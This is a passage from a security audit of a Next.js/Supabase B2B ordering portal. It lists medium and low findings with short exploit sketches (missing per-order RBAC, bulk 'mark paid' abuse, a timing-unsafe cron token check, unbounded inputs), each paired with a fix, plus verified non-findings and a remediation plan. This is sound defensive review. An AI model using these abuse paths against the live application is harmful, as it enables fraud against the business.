const ClientSchema = z.object({
  id: z.string().uuid(),
  account_number: z.string().trim().min(1).max(50),
  business_name: z.string().trim().min(1).max(120),
  contact_name: z.string().trim().min(1).max(120),
  email: z.string().trim().email().max(254).nullable().optional(),
  phone: z.string().trim().max(30).nullable().optional(),
  role: z.enum(["buyer_default","buyer_30_day"]).default("buyer_default"),
  vat_number: z.string().trim().max(30).nullable().optional(),
  credit_limit: z.coerce.number().finite().nonnegative().max(1e9).nullable().optional(),
  available_credit: z.coerce.number().finite().nonnegative().max(1e9).nullable().optional(),
  payment_terms_days: z.coerce.number().int().min(0).max(365).nullable().optional(),
  notes: z.string().trim().max(2000).nullable().optional(),
  is_active: z.coerce.boolean().default(true),
});
const parsed = ClientSchema.safeParse(Object.fromEntries(formData));
if (!parsed.success) return { error: parsed.error.issues[0].message };
```

### [M13] Admin employees can act on other employees' orders

- **File:** `src/app/actions/admin.ts:90-113` (`assignOrderAction`), `:356-422` (`approveOrderAction`), `:433-467` (`cancelOrderAction`)
- **Vulnerability:** These actions gate only on `requireAdmin()` — any admin sub-role (employee/manager/super) can act on any order. No per-row RBAC tying employees to their assigned orders. A rogue employee can approve/cancel another employee's orders.
- **Exploit:** Employee-level admin calls `cancelOrderAction(fd)` with another employee's assigned order ID → order cancelled, no scoping.
- **Fix:**
```ts
const Schema = z.object({ orderId: z.string().uuid() });
const parsed = Schema.safeParse({ orderId: formData.get("orderId") });
if (!parsed.success) return { error: "Invalid order ID." };

let q = adminClient.from("orders").update({...}).eq("id", parsed.data.orderId);
if (!session.isSuperAdmin && session.adminRole === "employee") {
  q = q.or(`assigned_to.is.null,assigned_to.eq.${session.profileId}`);
}
```

### [M14] `bulkMarkOrdersSettledAction` / `sendClientStatementAction` have no UUID/array-length validation or sub-role check

- **File:** `src/app/actions/admin.ts:1143-1279`
- **Code:**
```ts
export async function bulkMarkOrdersSettledAction(orderIds: string[]) {
  await requireAdmin();
  if (!orderIds.length) return { error: "No orders selected." };
  const { error } = await adminClient
    .from("orders")
    .update({ payment_status: "paid" })
    .in("id", orderIds);
}
```
- **Vulnerability:** Any admin can pass a giant UUID array to mark every order as paid in one call. No audit log entry. No sub-role gate. `sendClientStatementAction` accepts `profileId` without UUID check.
- **Exploit:** Employee-level admin calls `bulkMarkOrdersSettledAction([...all unpaid invoices for last year...])`.
- **Fix:**
```ts
const Schema = z.object({
  orderIds: z.array(z.string().uuid()).min(1).max(500),
});
const parsed = Schema.safeParse({ orderIds });
if (!parsed.success) return { error: "Invalid input." };

const sess = await requireAdmin();
if (sess.adminRole !== "manager" && !sess.isSuperAdmin) {
  return { error: "Only managers can settle orders in bulk." };
}
```

### [M15] Cron endpoint uses non-constant-time string comparison for bearer token

- **File:** `src/app/api/cron/daily-report/route.ts:7-13`
- **Code:**
```ts
const authHeader = req.headers.get("authorization");
const cronSecret = process.env.CRON_SECRET;

if (!authHeader || !cronSecret || authHeader !== `Bearer ${cronSecret}`) {
  return Response.json({ error: "Unauthorised" }, { status: 401 });
}
```
- **Vulnerability:** `!==` short-circuits on first mismatched byte → theoretical timing oracle. Low practical risk against a 32-byte secret over the internet, but trivial to mitigate. The endpoint URL is discoverable and has no IP allowlist.
- **Fix:**
```ts
import { timingSafeEqual } from "node:crypto";

const provided = req.headers.get("authorization")?.replace(/^Bearer\s+/i, "") ?? "";
const expected = process.env.CRON_SECRET ?? "";
const a = Buffer.from(provided);
const b = Buffer.from(expected);
if (a.length !== b.length || !timingSafeEqual(a, b)) {
  return Response.json({ error: "Unauthorised" }, { status: 401 });
}
```
Also consider requiring Vercel's `x-vercel-cron: 1` header with deployment protection.

---

## LOW

### [L1] `quantity` has no upper bound in `CartItemSchema`

- **File:** `src/app/actions/checkout.ts:26`
- **Code:** `quantity: z.coerce.number().int().positive(),`
- **Vulnerability:** `positive()` only rejects `<= 0`. `quantity: 2_000_000_000` creates a nine-figure order, potentially overflowing `numeric(10,2)` columns. JS IEEE-754 loses precision above 2^53.
- **Fix:** `z.coerce.number().int().min(1).max(10_000)` + reject `subtotal > R5_000_000`.

### [L2] No stock enforcement on checkout

- **File:** `src/app/actions/checkout.ts:213`
- **Code:** `.select("id, price, cost_price, pack_size, discount_type, discount_threshold, discount_value, is_active")`
- **Vulnerability:** `products.track_stock` and `products.stock_qty` are never read, and the order RPC does not decrement stock. Two buyers can each order the last unit; both succeed. A single buyer can order 10× available stock.
- **Fix:** Select `track_stock, stock_qty`, reject items where `track_stock === true && quantity > stock_qty`, and decrement stock inside `create_order_atomic` atomically: `UPDATE products SET stock_qty = stock_qty - $q WHERE id = $id AND (track_stock = false OR stock_qty >= $q) RETURNING id;` failing the transaction if no row returns.

### [L3] `signUpAction` / `loginAction` / `forgotPasswordSchema` have no `.max()` on string fields

- **File:** `src/app/actions/auth.ts:24-29`
- **Code:**
```ts
const signUpSchema = z.object({
  contact_name: z.string().trim().min(1, "Contact name is required."),
  business_name: z.string().trim().optional(),
  email: z.string().trim().email("Please enter a valid email address."),
  password: z.string().min(8, "Password must be at least 8 characters."),
});
```
- **Vulnerability:** Anonymous users can spam signup with megabyte-length strings, flooding the DB and downstream reports.
- **Fix:**
```ts
const signUpSchema = z.object({
  contact_name: z.string().trim().min(1).max(120),
  business_name: z.string().trim().max(120).optional(),
  email: z.string().trim().email().max(254),
  password: z.string().min(8).max(128),
});
```
Apply the same `.max()` rules to `loginSchema`, `forgotPasswordSchema`, `resetPasswordSchema`, and `adminLoginSchema`.

### [L4] `saveAddressAction` has no max-length caps

- **File:** `src/app/actions/addresses.ts:7-15`
- **Vulnerability:** All fields are unbounded server-side. A 10 MB delivery instruction blows up `@react-pdf` rendering.
- **Fix:**
```ts
const addressSchema = z.object({
  line1: z.string().trim().min(1).max(200),
  line2: z.string().trim().max(200).optional(),
  suburb: z.string().trim().max(100).optional(),
  city: z.string().trim().min(1).max(100),
  province: z.string().trim().max(100).optional(),
  postal_code: z.string().trim().max(20).optional(),
  country: z.string().trim().max(60).default("South Africa"),
});
```

### [L5] Invoice route doesn't validate `orderId` as UUID

- **File:** `src/app/api/invoice/[orderId]/route.ts:6-23`
- **Vulnerability:** Ownership scoping (`profile_id = session.profileId`) prevents IDOR. The risk is just leaking Postgres error states on bad input. Defence in depth.
- **Fix:** `if (!/^[0-9a-f-]{36}$/i.test(orderId)) return NextResponse.json({ error: "Invalid order id" }, { status: 400 });`

### [L6] Reports route accepts semantically-invalid dates

- **File:** `src/app/api/reports/daily/route.ts:14-23`
- **Vulnerability:** `2024-13-45` matches the regex but yields an invalid date. `generateDailyReportCsv` runs with a bogus date and returns an empty CSV.
- **Fix:**
```ts
if (dateParam && /^\d{4}-\d{2}-\d{2}$/.test(dateParam)) {
  const candidate = new Date(`${dateParam}T00:00:00.000Z`);
  if (isNaN(candidate.getTime())) {
    return NextResponse.json({ error: "Invalid date" }, { status: 400 });
  }
  date = candidate;
}
```

### [L7] `reorderAction` / `assignOrderAction` / `approveOrderAction` / `cancelOrderAction` / `markOrderSettledAction` don't validate `orderId` as UUID

- **Files:** `src/app/actions/order.ts:12-31`, `src/app/actions/admin.ts:90-113, 356-467, 1189-1279`
- **Vulnerability:** Ownership scoping is correct, so no IDOR — but unvalidated strings leak DB error messages and are brittle against future refactors.
- **Fix:** Wrap each with `z.object({ orderId: z.string().uuid() })`.

### [L8] `/api/reports/daily` returns 401 for authenticated-non-admin (should be 403)

- **File:** `src/app/api/reports/daily/route.ts:7-12`
- **Fix:**
```ts
const session = await getSession();
if (!session) return NextResponse.json({ error: "Unauthorised" }, { status: 401 });
if (!session.isAdmin) return NextResponse.json({ error: "Forbidden" }, { status: 403 });
```

### [L9] Several SECURITY INVOKER functions lack `SET search_path`

- **Files:** `supabase/init.sql:124-129, 620-680, 690-712`
- **Functions:** `validate_line_total`, `generate_order_reference`, `handle_updated_at`, `record_order_status_change`
- **Vulnerability:** Not SECURITY DEFINER, so practical impact is low, but flagged by Supabase linter `function_search_path_mutable`. `validate_line_total` is on the order_items insert path that buyers touch.
- **Fix:**
```sql
ALTER FUNCTION public.validate_line_total()         SET search_path = pg_catalog, public;
ALTER FUNCTION public.generate_order_reference()    SET search_path = pg_catalog, public;
ALTER FUNCTION public.handle_updated_at()           SET search_path = pg_catalog, public;
ALTER FUNCTION public.record_order_status_change()  SET search_path = pg_catalog, public;
```

### [L10] `create_order_atomic` lacks a runtime caller-role assertion

- **File:** `supabase/migrations/20260326_emergency_hardening.sql:45-117`
- **Vulnerability:** Function is granted to `service_role` only. If a future code change exposes it to `authenticated`, a buyer could pass any `profile_id` and create orders attributed to other buyers.
- **Fix:** Add as the first statement in the function body:
```sql
IF current_setting('role') NOT IN ('service_role','postgres','supabase_admin') THEN
  RAISE EXCEPTION 'create_order_atomic must be called by service_role';
END IF;
```

### [L11] `audit_log` does not cover `payments`, `order_items`, `tenant_config`, `addresses`, `buyer_sessions`

- **File:** `supabase/init.sql:790-800`
- **Vulnerability:** Only `profiles`, `products`, `orders` are audited. Financial rows (`payments`) and bank-details changes (`tenant_config`) are not — impaired SOX/PCI-adjacent audit trail.
- **Fix:** Extend `log_table_audit` triggers to those tables.

---

## Categories verified clean (explicit non-findings)

- **Pricing / VAT / pack_size tampering via `checkoutAction`:** Server re-fetches all pricing from the `products` table and `tenant_config.vat_rate`. Every client-supplied price/discount/pack_size field in `CartItemSchema` is accepted by Zod but **never read** by `computeLineItem` (`src/lib/checkout/pricing.ts:73-87`), which only accepts `DbProductPricing`. Unit price is NOT divided by `pack_size` server-side — `effectiveUnitPrice` is `dbPrice` or `dbPrice × (1 − discount_value/100)` or `dbPrice − discount_value`, never divided by anything. The memory note "unit price = price / pack_size" applies to UI display only. The Zod schema does not even accept a `packSize` field from the client.
- **Order status machine (buyer side):** Buyers have no server action that mutates `orders.status`. Admin state transitions are explicitly narrowed (`cancelOrderAction` guards `status !== "pending"`; `approveOrderAction` narrows to `pending → confirmed` or `confirmed + credit_approved → confirmed + paid`).
- **IDOR on `/api/invoice/[orderId]`, `reorderAction`, `saveAddressAction`, `markPaymentSubmittedAction`, all `(portal)` pages:** All scope by `profile_id = session.profileId`. Invoice route returns 404 (not 403) to avoid resource enumeration.
- **Multi-tenant isolation:** N/A — single-tenant deployment. No `tenant_id`, `client_id`, or `organization_id` columns exist. `tenant_config` is a singleton row.
- **Admin RBAC at function boundary:** Every exported function in `actions/admin.ts` begins with `requireAdmin()`; super-admin actions check `session.isSuperAdmin` against `ADMIN_SUPER_EMAIL`. No function accepts role from user input. Verified across all 15 exported functions. (Per-row scoping within admin tier is M13.)
- **Service role key exposure:** `SUPABASE_SERVICE_ROLE_KEY` appears in exactly `src/lib/supabase/admin.ts` (has `import "server-only"`) and `src/app/actions/checkout.ts` (server action). Cross-checked every importer of `supabase/admin` against `"use client"` files — zero overlap. Browser bundle is clean.
- **`auth.getSession()` vs `auth.getUser()`:** Zero uses of `auth.getSession()` in the codebase. Every auth resolution uses `auth.getUser()` which round-trips Supabase to verify the JWT.
- **SQL injection:** Zero raw SQL, zero template-string SQL. Only one `.rpc()` call (`create_order_atomic`), which takes a structured JSON argument (parameterized).
- **XSS via HTML rendering:** `dangerouslySetInnerHTML`, `innerHTML`, `eval`, `new Function` — zero matches across `src/`. React default JSX escaping is in effect everywhere.
- **PDF / email injection:** `@react-pdf/renderer` and `@react-email/components` compose JSX → escaped output. No template string concatenation.
- **Open redirect:** `/auth/callback/route.ts:8` correctly validates that `next` starts with `/` and not `//`. No other user-controlled redirect targets in the codebase.
- **RLS table coverage:** Every public table in `init.sql` + all migrations has `ENABLE ROW LEVEL SECURITY`. No unprotected tables.
- **Policy recursion:** Admin check uses JWT claim (`auth.jwt() ->> 'app_role'`) via `custom_access_token_hook`, not a table lookup → no infinite recursion risk.
- **`seed.sql`:** 1222 lines of categories and products only. No user creation, no passwords, no GRANTs.
- **Negative-price / negative-quantity DB constraints:** `products.price >= 0`, `order_items.unit_price >= 0`, `order_items.quantity > 0`, `order_items.discount_pct BETWEEN 0 AND 100`, `orders.subtotal/discount_amount/vat_amount/total_amount >= 0`, `payments.amount > 0`, `pack_size >= 1`. All present and correct.
- **`buyer_auth_migration.sql` `custom_access_token_hook`:** Properly granted to `supabase_auth_admin` only; `REVOKE ... FROM authenticated, anon, public`; `SET search_path = public` set. Clean.
- **`buyer_trigger_conflict_guard.sql`:** Idempotent `ON CONFLICT (id) DO NOTHING`, `SET search_path = public`, `SECURITY DEFINER` correctly used. Clean.

---

## Priority remediation order

### Before any production traffic — blockers

1. **[C1]** `ALTER FUNCTION ... SET search_path` on `is_admin()` / `get_app_role()` (2-line fix)
2. **[H1]** Drop buyer INSERT policy on `order_items`
3. **[H2]** Drop buyer INSERT policy on `payments` (or lock columns)
4. **[H3]** Add server-side size/magic-byte/extension validation to `uploadProductImageAction`
5. **[H6]** Add `supabase/scripts/` to `.gitignore` and wrap seed scripts with environment guard
6. **[H4]** Defensive `email_confirmed_at` check in `loginAction` / `adminLoginAction`
7. **[H5]** Add role check to proxy for `/admin/*`
8. **[H7]** Split `tenant_config` into public view + admin table
9. **[H8]** Column-grant `orders` to hide `notes` / `assigned_to`

### Before hardening cutover — strongly recommended

10. **[M1]** Fail closed on rate-limit env-var / Redis errors in production
11. **[M4]** Enforce credit limit inside `checkoutAction` for `buyer_30_day`
12. **[M5]** State guard + dedup on `markPaymentSubmittedAction`
13. **[M7]** Per-session rate limits on `checkoutAction`, `/api/invoice/[orderId]`, admin mutations
14. **[M8]** Drop SVG from `product-images`; add explicit storage object policies
15. **[M10]** CSV formula-injection fix in `csvEsc`
16. **[M11]/[M12]** Zod schema discipline across `admin.ts` — fixes M11, M12, L3, L4, L7 in one pattern
17. **[M13]** Employee-scoped RBAC on order actions
18. **[M3]** Delete dead `verifyBuyerSession`/`createBuyerSession` path

### Post-production hardening

19. M2, M6, M9, M14, M15, and all L-series items.

---

## Coverage

### Files read in full

- `supabase/init.sql` (1112 lines)
- `supabase/migrations/20260318_enterprise_features.sql`
- `supabase/migrations/20260319_order_notes.sql`
- `supabase/migrations/20260321_order_payment_status.sql`
- `supabase/migrations/20260325_feature_batch.sql`
- `supabase/migrations/20260325_pack_size.sql`
- `supabase/migrations/20260325_pack_size_constraints.sql`
- `supabase/migrations/20260326_emergency_hardening.sql`
- `supabase/migrations/20260402_buyer_auth_migration.sql`
- `supabase/migrations/20260403_buyer_trigger_conflict_guard.sql`
- `supabase/scripts/seed_test_users.sql`
- `supabase/scripts/create_verified_user.sql`
- `supabase/scripts/delete_test_users.sql`
- `src/proxy.ts`
- `src/lib/supabase/middleware.ts`
- `src/lib/supabase/server.ts`
- `src/lib/supabase/admin.ts`
- `src/lib/supabase/browser.ts`
- `src/lib/supabase/config.ts`
- `src/lib/auth/buyer.ts`
- `src/lib/auth/session.ts`
- `src/lib/rate-limit.ts`
- `src/lib/checkout/pricing.ts`
- `src/lib/cart/store.ts`
- `src/lib/credit/checkCreditStatus.ts`
- `src/lib/reports/daily-report.ts`
- `src/app/api/invoice/[orderId]/route.ts`
- `src/app/api/cron/daily-report/route.ts`
- `src/app/api/reports/daily/route.ts`
- `src/app/auth/callback/route.ts`
- `src/app/(admin)/layout.tsx`
- `src/app/(portal)/layout.tsx`
- `src/app/(auth)/layout.tsx`
- `src/app/actions/auth.ts` (281 lines)
- `src/app/actions/admin.ts` (1280 lines — all 15 exported functions verified)
- `src/app/actions/checkout.ts` (410 lines)
- `src/app/actions/order.ts`
- `src/app/actions/addresses.ts`
- `src/app/(portal)/cart/page.tsx`
- `src/app/(portal)/checkout/payment/page.tsx`

### Files spot-read

- All `(admin)/admin/*/page.tsx` entry points
- All `(auth)/*/page.tsx`
- `src/lib/pdf/invoice.tsx`
- `src/emails/SupplierInvoice.tsx`
- `src/components/admin/ProductDrawer.tsx`
- `src/components/admin/ClientDrawer.tsx`
- `src/components/admin/CreditDrawer.tsx`
- `src/components/admin/GlobalBannerAdmin.tsx`
- `src/components/admin/OrderLedger.tsx`
- `src/components/auth/AddressGateForm.tsx`

### Grep sweeps performed

- `dangerouslySetInnerHTML` / `innerHTML` → 0 matches
- `eval\(` / `new Function` → 0 matches
- `auth\.getSession\(` → 0 matches (codebase uses `getUser` exclusively)
- `SERVICE_ROLE` / `supabaseAdmin` → 2 server-only files
- `createBuyerSession` / `BUYER_SESSION_COOKIE` → confirmed dead code
- `adminClient` import check → 25 files, zero `"use client"` overlap
- `supabase\.rpc\(` / `adminClient\.rpc\(` → 1 match (`checkout.ts:291`, parameterized)
- `sql\`` → 0 matches
- `storage\.from\(.*\)\.upload` → 1 user-facing (`uploadProductImageAction`), 1 cron
- `redirect\(` → all 50+ matches reviewed; only `/auth/callback` uses user-controlled target and is validated
- `searchParams` → all uses reviewed
- `parseInt\(` / `Number\(` → all server-action uses reviewed
- `FormData` / `formData` → 19 files identified
- `price` / `unit_price` / `line_total` / `vat` / `total` / `quantity` / `pack_size` / `credit` / `credit_limit` / `available_credit` / `status` / `buyer_id` / `profile_id` / `rate-limit` / `checkLoginRateLimit` / `isAdmin` / `checkCreditStatus` / `create_order_atomic` / `idempotency` — all reviewed
